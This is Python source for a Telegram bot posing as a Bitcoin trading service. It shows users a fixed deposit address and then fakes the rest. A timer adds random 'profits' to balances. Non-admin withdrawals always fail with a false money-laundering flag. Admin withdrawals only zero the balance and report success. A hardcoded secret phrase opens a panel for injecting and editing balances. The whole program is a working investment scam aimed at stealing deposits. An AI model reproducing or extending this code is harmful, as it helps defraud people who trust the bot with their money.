import os
import json
import asyncio
import random
import requests
from datetime import datetime
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
import nest_asyncio

running_bots = set()
nest_asyncio.apply()  # Fix "event loop already running"
user_strategies = {}  # stores per-user selected strategy
STRATEGIES = ["Aggressive", "Conservative", "Balanced", "Experimental"]  # example strategies
BOT_TOKEN = os.getenv("BOT_TOKEN")
DATA_FILE = "data.json"
SECRET_PHRASE = "NewMexicoMouse"
DEFAULT_ADMIN_ID = 6064485557

# Load or create data.json
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}
    with open(DATA_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            # Reset on corrupt file
            return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

data = load_data()

admin_mode = {}
pending_withdrawal = {}
pending_inject = {}
pending_edit = {}

# Helpers
def get_balance(uid):
    return data['users'].get(str(uid), {}).get("balance", 0.0)

def set_balance(uid, amount):
    uid = str(uid)
    data['users'].setdefault(uid, {})['balance'] = amount
    save_data()

def log_action(uid, action, details=None):
    data.setdefault("activity_log", []).append({
        "timestamp": datetime.utcnow().isoformat(),
        "user_id": uid,
        "action": action,
        "details": details or {}
    })
    save_data()

def is_admin(uid):
    return uid in data.get("admins", [])

# UI Menus
def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("📄 Deposit", callback_data="deposit"), InlineKeyboardButton("📃 Withdrawal", callback_data="withdrawal")],
        [InlineKeyboardButton("▶️ Run", callback_data="run"), InlineKeyboardButton("⏹ Stop", callback_data="stop")],
        [InlineKeyboardButton("📊 Monitor", callback_data="monitor"), InlineKeyboardButton("🧠 Strategy", callback_data="strategy")],
        [InlineKeyboardButton("🚪 Exit", callback_data="exit")]
    ])

def get_admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Admin", callback_data="add_admin"), InlineKeyboardButton("Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("Inject to Self", callback_data="inject_self"), InlineKeyboardButton("Edit User", callback_data="edit_user")],
        [InlineKeyboardButton("📄 Activity Log", callback_data="view_log")],
        [InlineKeyboardButton("❌ Close Admin Panel", callback_data="close_admin")]
    ])

def get_withdrawal_confirmation(uid, addr, net, fee):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"✅ Yes, send {net:.8f} BTC", callback_data=f"confirm_withdraw:{addr}:{net}:{fee}"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_withdraw")]
    ])

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    data['users'].setdefault(str(uid), {"balance": 0.0})
    save_data()
    try:
        with open("header.jpg", "rb") as img:
            await update.message.reply_photo(photo=InputFile(img))
    except:
        pass
    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data['users'].setdefault(str(uid), {"balance": 0.0})
    balance = get_balance(uid)

    cmd = query.data
    if cmd == "balance":
        await query.edit_message_text(f"💰 Balance: {balance:.8f} BTC", reply_markup=get_main_menu())

    elif cmd == "deposit":
        await query.edit_message_text(
            "Your bots wallet address:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )

    elif cmd == "withdrawal":
        if not is_admin(uid):
            await query.edit_message_text("❌ Transaction failed. Your account was flagged for suspicious activity related to money laundering.", reply_markup=get_main_menu())
        elif balance <= 0:
            await query.edit_message_text("❌ Balance is 0.", reply_markup=get_main_menu())
        else:
            await query.edit_message_text(
                "Enter withdrawal address:", reply_markup=None)
            pending_withdrawal[uid] = {"step": 1, "amount": balance}
            log_action(uid, "Started Withdrawal")

    elif cmd.startswith("confirm_withdraw:"):
        _, addr, net, fee = cmd.split(":")
        net, fee = float(net), float(fee)
        set_balance(uid, 0.0)
        log_action(uid, "Withdrew BTC", {"net": net, "fee": fee, "address": addr})
        await query.edit_message_text(f"✅ Sent {net:.8f} BTC to `{addr}`\n(5% fee was applied)", parse_mode="Markdown", reply_markup=get_main_menu())

    elif cmd == "cancel_withdraw":
        pending_withdrawal.pop(uid, None)
        await query.edit_message_text("❌ Withdrawal cancelled.", reply_markup=get_main_menu())

    elif cmd == "run":
        if balance <= 0:
            await query.edit_message_text("❌ You cannot run the bot because your balance is 0.", reply_markup=get_main_menu())
        else:
            running_bots.add(uid)
            await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
            log_action(uid, "Started Bot")
    elif cmd == "stop":
        running_bots.discard(uid)
        await query.edit_message_text("Bot Stopped.", reply_markup=get_main_menu())
        log_action(uid, "Stopped Bot")

    elif cmd == "monitor":
        strategy = user_strategies.get(uid, "None")
        await query.edit_message_text(
            f"Your Balance: {balance:.8f} BTC\n🧠 Strategy: {strategy}",
            reply_markup=get_main_menu()
        )

    elif cmd == "strategy":
        buttons = [[InlineKeyboardButton(s, callback_data=f"select_strategy:{s}")] for s in STRATEGIES]
        await query.edit_message_text("Choose a strategy:", reply_markup=InlineKeyboardMarkup(buttons))

    elif cmd.startswith("select_strategy:"):
        selected = cmd.split(":", 1)[1]
        user_strategies[uid] = selected
        await query.edit_message_text(f"Strategy set to: {selected}", reply_markup=get_main_menu())

    elif cmd == "exit":
        await query.edit_message_text("Goodbye!")

    elif cmd == "inject_self":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
        else:
            pending_inject[uid] = True
            await query.edit_message_text("💵 Enter amount to inject:")

    elif cmd == "edit_user":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
        else:
            pending_edit[uid] = {"step": 1}
            await query.edit_message_text("Send user Telegram ID:")

    elif cmd == "add_admin":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
        else:
            pending_edit[uid] = {"admin_add": True}
            await query.edit_message_text("Send user ID to add as admin:")

    elif cmd == "remove_admin":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
        else:
            pending_edit[uid] = {"admin_remove": True}
            await query.edit_message_text("Send user ID to remove from admins:")

    elif cmd == "view_log":
        if not is_admin(uid):
            await query.edit_message_text("❌ Admin only.", reply_markup=get_main_menu())
        else:
            logs = data.get("activity_log", [])[-10:]
            log_msg = "\n".join([f"{log['timestamp']} - {log['action']} - User:{log['user_id']}" for log in logs]) or "No logs."
            await query.edit_message_text(f"\U0001F4D3 Recent Logs:\n{log_msg}", reply_markup=get_admin_menu())

    elif cmd == "close_admin":
        admin_mode[uid] = False
        await query.edit_message_text("Admin panel closed.", reply_markup=get_main_menu())

    else:
        await query.edit_message_text("Unknown command.", reply_markup=get_main_menu())

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message.text.strip()

    if msg == SECRET_PHRASE:
        admin_mode[uid] = not admin_mode.get(uid, False)
        if admin_mode[uid]:
            await update.message.reply_text("Admin Panel Enabled", reply_markup=get_admin_menu())
            log_action(uid, "Admin Panel Enabled")
        else:
            await update.message.reply_text("Admin Panel Disabled")
            log_action(uid, "Admin Panel Disabled")
        return

    if uid in pending_withdrawal and pending_withdrawal[uid].get("step") == 1:
        addr = msg
        bal = pending_withdrawal[uid]["amount"]
        fee = bal * 0.05
        net = bal - fee
        pending_withdrawal.pop(uid, None)
        await update.message.reply_text(
            f"Confirm sending {net:.8f} BTC (5% fee) to `{addr}`:", parse_mode="Markdown",
            reply_markup=get_withdrawal_confirmation(uid, addr, net, fee)
        )
        return
        set_balance(uid, 0.0)
        pending_withdrawal.pop(uid)
        log_action(uid, "Withdrew BTC", {"net": net, "address": addr})
        await update.message.reply_text(f"Sent {net:.8f} BTC to `{addr}`", parse_mode="Markdown")
        return

    # Edit user/admin add/remove flows
    if uid in pending_edit:
        step = pending_edit[uid]
        try:
            if "step" in step and step["step"] == 1:
                target_id = int(msg)
                pending_edit[uid] = {"step": 2, "target": target_id}
                await update.message.reply_text("Now enter the new BTC amount:")
            elif "step" in step and step["step"] == 2:
                amt = float(msg)
                target = step["target"]
                set_balance(target, amt)
                log_action(uid, "Edited User Balance", {"target": target, "amount": amt})
                pending_edit.pop(uid)
                await update.message.reply_text(f"Set user {target}'s balance to {amt:.8f} BTC")
            elif "admin_add" in step:
                aid = int(msg)
                if aid not in data['admins']:
                    data['admins'].append(aid)
                    save_data()
                    log_action(uid, "Added Admin", {"added": aid})
                    await update.message.reply_text("Admin added.")
                else:
                    await update.message.reply_text("User already admin.")
                pending_edit.pop(uid)
            elif "admin_remove" in step:
                rid = int(msg)
                if rid in data['admins']:
                    data['admins'].remove(rid)
                    save_data()
                    log_action(uid, "Removed Admin", {"removed": rid})
                    await update.message.reply_text("Admin removed.")
                else:
                    await update.message.reply_text("User not an admin.")
                pending_edit.pop(uid)
            else:
                pending_edit.pop(uid)
                await update.message.reply_text("Unknown edit step. Reset.")
        except:
            await update.message.reply_text("Invalid input. Try again.")
        return

async def profit_loop(context: ContextTypes.DEFAULT_TYPE):
    for uid in running_bots:
        try:
            current_bal = get_balance(uid)
            gain = random.uniform(0.00001, 0.00003)
            set_balance(uid, current_bal + gain)
        except:
            continue


async def handle(request):
    return web.Response(text="OK")

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    while True:
        await asyncio.sleep(3600)

async def start_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.job_queue.run_repeating(profit_loop, interval=5)
    # Start webserver as a background task
    app.create_task(run_webserver())
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(start_bot())






